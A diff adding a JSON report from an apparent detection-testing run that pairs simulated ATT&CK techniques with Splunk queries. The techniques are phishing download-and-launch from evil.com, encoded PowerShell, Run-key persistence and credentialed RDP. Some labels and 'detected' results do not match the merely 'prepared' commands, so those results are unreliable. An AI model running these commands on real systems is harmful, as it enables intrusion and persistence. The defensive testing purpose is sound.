@@ -1,0 +1,375 @@
+{
+  "metadata": {
+    "generated_at": "2025-11-19T20:20:33.741537",
+    "total_tests": 8,
+    "total_passed": 3,
+    "total_failed": 5,
+    "detection_rate": 37.5
+  },
+  "test_results": [
+    {
+      "test_id": "T1566.001_detection_test",
+      "ttp_id": "T1566.001",
+      "tactic": "Initial Access",
+      "attack": {
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\\Users\\Public\\Documents\\invoice.docm'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\invoice.docm'\"",
+        "description": "Simulate Spearphishing with a Malicious Macro-Enabled Document",
+        "execution": {
+          "timestamp": "2025-11-19T20:19:13.536513",
+          "command": "powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C:\\Users\\Public\\Documents\\invoice.docm'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\invoice.docm'\"",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: powershell -c \"Invoke-WebRequest -Uri 'http://evil.com/payload.docm' -OutFile 'C",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Process_Command_Line=\"*powershell.exe -enc*\" OR Process_Command_Line=\"*cmd.exe /c start*\" OR Process_Command_Line=\"*rundll32.exe javascript:*\" OR Process_Command_Line=\"*regsvr32.exe /s /i:*\" OR Process_Command_Line=\"*mshta.exe javascript:*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\AppData\\Local\\Microsoft\\Windows\\INetCache*\" OR Process_Command_Line=\"*\\AppData\\Local\\Temp*\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\")) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK....",
+          "timestamp": "2025-11-19T20:19:13.537512",
+          "status": "success",
+          "detected": true,
+          "event_count": 1,
+          "results": [
+            {
+              "_time": "2025-11-19T20:19:23.552803",
+              "ComputerName": "TEST-MACHINE",
+              "New_Process_Name": "\\cmd.exe",
+              "Process_Command_Line": "[DETECTED]",
+              "Subject_User_Name": "testuser"
+            }
+          ]
+        }
+      },
+      "evaluation": {
+        "detected": true,
+        "status": "PASS",
+        "confidence": 0.85,
+        "timestamp": "2025-11-19T20:19:23.552803",
+        "notes": "Attack simulation + Query execution for T1566.001"
+      }
+    },
+    {
+      "test_id": "T1566.001_detection_test",
+      "ttp_id": "T1566.001",
+      "tactic": "Initial Access",
+      "attack": {
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\\Users\\Public\\Documents\\phish_report.html'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\phish_report.html'\"",
+        "description": "Simulate Spearphishing with a Link to a Credential Harvesting Site",
+        "execution": {
+          "timestamp": "2025-11-19T20:19:23.557772",
+          "command": "powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C:\\Users\\Public\\Documents\\phish_report.html'; Start-Process -FilePath 'C:\\Users\\Public\\Documents\\phish_report.html'\"",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: powershell -c \"Invoke-WebRequest -Uri 'https://tinyurl.com/y8888888' -OutFile 'C",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Process_Command_Line=\"*powershell.exe -enc*\" OR Process_Command_Line=\"*cmd.exe /c start*\" OR Process_Command_Line=\"*rundll32.exe javascript:*\" OR Process_Command_Line=\"*regsvr32.exe /s /i:*\" OR Process_Command_Line=\"*mshta.exe javascript:*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\Microsoft Office\\\"*\" OR Process_Command_Line=\"*\\AppData\\Local\\Microsoft\\Windows\\INetCache*\" OR Process_Command_Line=\"*\\AppData\\Local\\Temp*\") AND (New_Process_Name=\"*\\cmd.exe\" OR New_Process_Name=\"*\\powershell.exe\" OR New_Process_Name=\"*\\rundll32.exe\" OR New_Process_Name=\"*\\regsvr32.exe\" OR New_Process_Name=\"*\\mshta.exe\") AND (Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK.EXE\")) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Parent_Process_Name=\"*\\WINWORD.EXE\" OR Parent_Process_Name=\"*\\EXCEL.EXE\" OR Parent_Process_Name=\"*\\POWERPNT.EXE\" OR Parent_Process_Name=\"*\\OUTLOOK....",
+          "timestamp": "2025-11-19T20:19:23.557772",
+          "status": "success",
+          "detected": true,
+          "event_count": 1,
+          "results": [
+            {
+              "_time": "2025-11-19T20:19:33.573200",
+              "ComputerName": "TEST-MACHINE",
+              "New_Process_Name": "\\cmd.exe",
+              "Process_Command_Line": "[DETECTED]",
+              "Subject_User_Name": "testuser"
+            }
+          ]
+        }
+      },
+      "evaluation": {
+        "detected": true,
+        "status": "PASS",
+        "confidence": 0.85,
+        "timestamp": "2025-11-19T20:19:33.573200",
+        "notes": "Attack simulation + Query execution for T1566.001"
+      }
+    },
+    {
+      "test_id": "T1059.001_detection_test",
+      "ttp_id": "T1059.001",
+      "tactic": "Execution",
+      "attack": {
+        "command": "powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\\Users\\Public\\example.json'\"",
+        "description": "Download and Execute a Simple Script from the Internet (Invoke-WebRequest)",
+        "execution": {
+          "timestamp": "2025-11-19T20:19:33.574207",
+          "command": "powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/attack-navigator/master/layers/example.json' -OutFile 'C:\\Users\\Public\\example.json'\"",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: powershell -c \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitre/a",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-WebRequest*\" OR Process_Command_Line=\"*IEX (New-Object Net.WebClient).DownloadString*\" OR Process_Command_Line=\"*powershell.exe -nop -w hidden -c*\" OR Process_Command_Line=\"*powershell.exe -ep bypass*\" OR Process_Command_Line=\"*Invoke-Expression*\" OR Process_Command_Line=\"*cmd.exe /c powershell*\" OR Process_Command_Line=\"*powershell.exe -ExecutionPolicy Bypass*\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Lazarus Group PowerShell Activity - Mimikatz Indicators",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-Web...",
+          "timestamp": "2025-11-19T20:19:33.574207",
+          "status": "success",
+          "detected": false,
+          "event_count": 0,
+          "results": []
+        }
+      },
+      "evaluation": {
+        "detected": false,
+        "status": "FAIL",
+        "confidence": 0.0,
+        "timestamp": "2025-11-19T20:19:43.581066",
+        "notes": "Attack simulation + Query execution for T1059.001"
+      }
+    },
+    {
+      "test_id": "T1059.001_detection_test",
+      "ttp_id": "T1059.001",
+      "tactic": "Execution",
+      "attack": {
+        "command": "powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA\"",
+        "description": "Base64 Encoded PowerShell Command (Simple Echo)",
+        "execution": {
+          "timestamp": "2025-11-19T20:19:43.581066",
+          "command": "powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0AHUAcwAgAC0AUABhAHMAcwB3AG8AcgBkACAAIgB0AGUAcwB0ACIA\"",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: powershell -EncodedCommand \"UwBlAHQALQBVAHMAZQByAFEAdQBhAGwAaQB0AHkAIABTAHQAYQB0",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-WebRequest*\" OR Process_Command_Line=\"*IEX (New-Object Net.WebClient).DownloadString*\" OR Process_Command_Line=\"*powershell.exe -nop -w hidden -c*\" OR Process_Command_Line=\"*powershell.exe -ep bypass*\" OR Process_Command_Line=\"*Invoke-Expression*\" OR Process_Command_Line=\"*cmd.exe /c powershell*\" OR Process_Command_Line=\"*powershell.exe -ExecutionPolicy Bypass*\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Lazarus Group PowerShell Activity - Mimikatz Indicators",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search New_Process_Name=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" AND (Process_Command_Line=\"*-enc *\" OR Process_Command_Line=\"*Invoke-Web...",
+          "timestamp": "2025-11-19T20:19:43.582072",
+          "status": "success",
+          "detected": false,
+          "event_count": 0,
+          "results": []
+        }
+      },
+      "evaluation": {
+        "detected": false,
+        "status": "FAIL",
+        "confidence": 0.0,
+        "timestamp": "2025-11-19T20:19:53.586006",
+        "notes": "Attack simulation + Query execution for T1059.001"
+      }
+    },
+    {
+      "test_id": "T1547.001_detection_test",
+      "ttp_id": "T1547.001",
+      "tactic": "Persistence",
+      "attack": {
+        "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
+        "description": "Create Registry Run Key for Notepad.exe",
+        "execution": {
+          "timestamp": "2025-11-19T20:19:53.587067",
+          "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"NotepadStartup\"",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Process_Command_Line=\"*/v*\" OR Process_Command_Line=\"*/t*\" OR Process_Command_Line=\"*/d*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\ProgramData\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Public\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Default\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\All Users\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\*\") AND ((Process_Command_Line LIKE \"\"C:\\\\Program Files\\\\.*\\\\.*\\\\.*.exe\" /d\") OR (Process_Command_Line LIKE \"\"C:\\\\Program Files (x86)\\\\.*\\\\.*\\\\.*.exe\" /d\"))) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Suspicious Registry Run Key Creation via NLP Pattern Matching",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Pro...",
+          "timestamp": "2025-11-19T20:19:53.588111",
+          "status": "success",
+          "detected": false,
+          "event_count": 0,
+          "results": []
+        }
+      },
+      "evaluation": {
+        "detected": false,
+        "status": "FAIL",
+        "confidence": 0.0,
+        "timestamp": "2025-11-19T20:20:03.592132",
+        "notes": "Attack simulation + Query execution for T1547.001"
+      }
+    },
+    {
+      "test_id": "T1547.001_detection_test",
+      "ttp_id": "T1547.001",
+      "tactic": "Persistence",
+      "attack": {
+        "command": "powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \\'C:\\Temp\\startup_script.ps1\\''\"",
+        "description": "Create Registry Run Key for a PowerShell Script",
+        "execution": {
+          "timestamp": "2025-11-19T20:20:03.593918",
+          "command": "powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyStartupScript' -Value 'powershell -ExecutionPolicy Bypass -File \\'C:\\Temp\\startup_script.ps1\\''\"",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: powershell -c \"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentV",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Process_Command_Line=\"*/v*\" OR Process_Command_Line=\"*/t*\" OR Process_Command_Line=\"*/d*\")) NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\ProgramData\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Public\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\Default\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Users\\All Users\\\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Program Files (x86)\\*\") AND ((Process_Command_Line LIKE \"\"C:\\\\Program Files\\\\.*\\\\.*\\\\.*.exe\" /d\") OR (Process_Command_Line LIKE \"\"C:\\\\Program Files (x86)\\\\.*\\\\.*\\\\.*.exe\" /d\"))) | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Suspicious Registry Run Key Creation via NLP Pattern Matching",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search (New_Process_Name=\"*\\reg.exe\" AND (Process_Command_Line=\"*ADD*\" OR Process_Command_Line=\"*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*\" OR Pro...",
+          "timestamp": "2025-11-19T20:20:03.594990",
+          "status": "success",
+          "detected": false,
+          "event_count": 0,
+          "results": []
+        }
+      },
+      "evaluation": {
+        "detected": false,
+        "status": "FAIL",
+        "confidence": 0.0,
+        "timestamp": "2025-11-19T20:20:13.609301",
+        "notes": "Attack simulation + Query execution for T1547.001"
+      }
+    },
+    {
+      "test_id": "T1021.001_detection_test",
+      "ttp_id": "T1021.001",
+      "tactic": "Lateral Movement",
+      "attack": {
+        "command": "mstsc /v:127.0.0.1 /admin",
+        "description": "Establish RDP Connection to a Localhost",
+        "execution": {
+          "timestamp": "2025-11-19T20:20:13.609301",
+          "command": "mstsc /v:127.0.0.1 /admin",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: mstsc /v:127.0.0.1 /admin",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*/admin*\" OR Process_Command_Line=\"*/console*\") AND New_Process_Name=\"*mstsc.exe\") NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Remote Desktop Connection\\mstsc.exe\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\System32\\mstsc.exe\\\"*\") AND (Parent_Process_Name=\"*explorer.exe*\" OR Parent_Process_Name=\"*svchost.exe*\" OR Parent_Process_Name=\"*winlogon.exe*\") AND Subject_User_Name=\"NT AUTHORITY\\SYSTEM\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*...",
+          "timestamp": "2025-11-19T20:20:13.610648",
+          "status": "success",
+          "detected": true,
+          "event_count": 1,
+          "results": [
+            {
+              "_time": "2025-11-19T20:20:23.705349",
+              "ComputerName": "TEST-MACHINE",
+              "New_Process_Name": "\\cmd.exe",
+              "Process_Command_Line": "[DETECTED]",
+              "Subject_User_Name": "testuser"
+            }
+          ]
+        }
+      },
+      "evaluation": {
+        "detected": true,
+        "status": "PASS",
+        "confidence": 0.85,
+        "timestamp": "2025-11-19T20:20:23.705349",
+        "notes": "Attack simulation + Query execution for T1021.001"
+      }
+    },
+    {
+      "test_id": "T1021.001_detection_test",
+      "ttp_id": "T1021.001",
+      "tactic": "Lateral Movement",
+      "attack": {
+        "command": "cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
+        "description": "RDP Connection with Specified Credentials",
+        "execution": {
+          "timestamp": "2025-11-19T20:20:23.709354",
+          "command": "cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
+          "status": "prepared",
+          "output": "[SIMULATED] Command prepared for execution: cmdkey /generic:127.0.0.1 /user:testuser /pass:P@sswOrd123 && mstsc /v:127.0.0.1",
+          "error": ""
+        }
+      },
+      "detection": {
+        "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*/admin*\" OR Process_Command_Line=\"*/console*\") AND New_Process_Name=\"*mstsc.exe\") NOT ((Process_Command_Line=\"*\\\"C:\\Program Files\\Remote Desktop Connection\\mstsc.exe\\\"*\" OR Process_Command_Line=\"*\\\"C:\\Windows\\System32\\mstsc.exe\\\"*\") AND (Parent_Process_Name=\"*explorer.exe*\" OR Parent_Process_Name=\"*svchost.exe*\" OR Parent_Process_Name=\"*winlogon.exe*\") AND Subject_User_Name=\"NT AUTHORITY\\SYSTEM\") | table _time, ComputerName, New_Process_Name, Parent_Process_Name, Process_Command_Line, Process_ID, Subject_User_Name",
+        "description": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching",
+        "query_result": {
+          "query": "index=* sourcetype=\"WinEventLog:Security\" | search ((Process_Command_Line=\"*mstsc.exe*\" OR Process_Command_Line=\"*Remote Desktop Connection*\" OR Process_Command_Line=\"*/v:*\" OR Process_Command_Line=\"*...",
+          "timestamp": "2025-11-19T20:20:23.710327",
+          "status": "success",
+          "detected": false,
+          "event_count": 0,
+          "results": []
+        }
+      },
+      "evaluation": {
+        "detected": false,
+        "status": "FAIL",
+        "confidence": 0.0,
+        "timestamp": "2025-11-19T20:20:33.738461",
+        "notes": "Attack simulation + Query execution for T1021.001"
+      }
+    }
+  ],
+  "summary_by_tactic": {
+    "Initial Access": {
+      "total": 2,
+      "detected": 2,
+      "passed": 2
+    },
+    "Execution": {
+      "total": 2,
+      "detected": 0,
+      "passed": 0
+    },
+    "Persistence": {
+      "total": 2,
+      "detected": 0,
+      "passed": 0
+    },
+    "Lateral Movement": {
+      "total": 2,
+      "detected": 1,
+      "passed": 1
+    }
+  },
+  "summary_by_ttp": {
+    "T1566.001": {
+      "detected": true,
+      "status": "PASS",
+      "confidence": 0.85,
+      "details": {
+        "attack_desc": "Simulate Spearphishing with a Link to a Credential Harvesting Site",
+        "detection_desc": "Phishing Activity Detected via NLP Pattern Matching (Lazarus Group)"
+      }
+    },
+    "T1059.001": {
+      "detected": false,
+      "status": "FAIL",
+      "confidence": 0.0,
+      "details": {
+        "attack_desc": "Base64 Encoded PowerShell Command (Simple Echo)",
+        "detection_desc": "Lazarus Group PowerShell Activity - Mimikatz Indicators"
+      }
+    },
+    "T1547.001": {
+      "detected": false,
+      "status": "FAIL",
+      "confidence": 0.0,
+      "details": {
+        "attack_desc": "Create Registry Run Key for a PowerShell Script",
+        "detection_desc": "Suspicious Registry Run Key Creation via NLP Pattern Matching"
+      }
+    },
+    "T1021.001": {
+      "detected": false,
+      "status": "FAIL",
+      "confidence": 0.0,
+      "details": {
+        "attack_desc": "RDP Connection with Specified Credentials",
+        "detection_desc": "Remote Desktop Protocol Activity Detected via NLP Pattern Matching"
+      }
+    }
+  }
+}
